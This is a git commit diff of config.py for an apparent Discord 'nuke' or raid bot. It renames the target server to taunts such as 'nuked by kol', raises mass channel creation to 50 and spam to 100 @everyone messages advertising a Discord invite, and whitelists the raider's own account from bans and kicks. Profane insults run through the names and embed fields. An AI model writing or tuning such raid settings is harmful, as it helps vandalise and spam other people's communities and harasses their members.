9dc794ab698be7fa6482b1a60376664d7cf5b55f
BAHUBALISID <128839129+BAHUBALISID@users.noreply.github.com>
2024-06-24 21:00:47 +0530

    Update config.py

--- config.py
+++ config.py
@@ -1,42 +1,42 @@
 SERVER_CONFIG = {
-    "new_name": "🥋ShadowNinjas🥋",  # New Server Name here      
-    "new_icon": "https://i.ibb.co/Mfd4Fg0/imagfes.png",   # New Server Icon url here → https://yourimage.jpg    
-    "new_description": "🥋ShadowNinjasOwned🥋",  # New Server Description here    
+    "new_name": "nuked by kol",  # New Server Name here      
+    "new_icon": "sid here babe kol here mfs you get fucked",   # New Server Icon url here → https://yourimage.jpg    
+    "new_description": "nuked by kol sid cry hard",  # New Server Description here    
 }
 
 WEBHOOK_CONFIG = {
-    "default_name": "🥋ShadowNinja🥋",  # Webhook Name here     
+    "default_name": "KOL SID",  # Webhook Name here     
 }
 
 
 AUTO_RAID_CONFIG = {
-    'num_channels': 25,  # Number of channels/ better max 50    
+    'num_channels': 50,  # Number of channels/ better max 50    
     'channel_type': 'text',  # text/voice     
-    'channel_name': '🥋ShadowNinjas🥋',  # Channel name      
-    'num_messages': 10,  # Number of message to spam/better max 30     
-    'message_content': '@everyone ちんぽ野郎、その結果がこれだ、くたばれ。🥋ShadowNinjas🥋ちんぽ野郎、その結果がこれだ、くたばれ。https://i.ibb.co/Mfd4Fg0/imagfes.png, https://discord.gg/PpHwQZP23C' # Spam Message     
+    'channel_name': 'NUKED BY KOL SID',  # Channel name      
+    'num_messages': 100,  # Number of message to spam/better max 30     
+    'message_content': '@everyone JOIN AND SUPPORT OUR SERVER  https://discord.gg/M4nWG6d3YN' # Spam Message     
 }
 
 NO_BAN_KICK_ID = {
-    000000000000,       # Put Whitelist ID
-    111111111111,       # No Ban & No Kick
-    222222222222,
+    1027444990139453484,       # Put Whitelist ID
+    1027444990139453484,       # No Ban & No Kick
+    1027444990139453484,
 }
 
 BOT_PRESENCE = {
-    "type": "playing",  # "playing", "listening", or "watching"
-    "text": "SecuritySystem"  # you status like playing SecuriySystem
+    "type": "streaming",  # "playing", "listening", or "watching"
+    "text": "sid_xD"  # you status like playing sid_xD
 }
 
 EMBED_CONFIG = {
-    "title": "🥋ShadowNinjasOwned🥋",    # Maine Embed Title here you can change it :3          
-    "description": "🥋ShadowNinjasOwned🥋",   # Main Embed Description here/ description of the discord server           
+    "title": "KolSidOwned",    # Maine Embed Title here you can change it :3          
+    "description": "KolSidOwned",   # Main Embed Description here/ description of the discord server           
     "color": 0xFF5733,   # Change embed color if you want (red) is 0xFF5733        
     "fields": [
-        {"name": "🥋ShadowNinjas🥋", "value": "🥋ShadowNinjas🥋", "inline": False},     
-        {"name": "🥋ShadowNinjas🥋", "value": "🥋ShadowNinjas🥋", "inline": False},
-        {"name": "🥋ShadowNinjas🥋", "value": "🥋ShadowNinjas🥋", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False      
+        {"name": "KolSidOwned", "value": "KolSidOwned", "inline": False},     
+        {"name": "KolSidOwned", "value": "KolSidOwned", "inline": False},
+        {"name": "KolSidOwned", "value": "KolSidOwned", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False      
     ],
-    "image": "https://i.ibb.co/Mfd4Fg0/imagfes.png",   # Embed Icon url here → https://yourimage.com     
-    "footer": "🥋ShadowNinjasOwned🥋",  # Embed Footer here/ just a text     
+    "image": "kol sid and kol owned you motherfuckers",   # Embed Icon url here → https://yourimage.com     
+    "footer": "KolSidOwned",  # Embed Footer here/ just a text     
 }
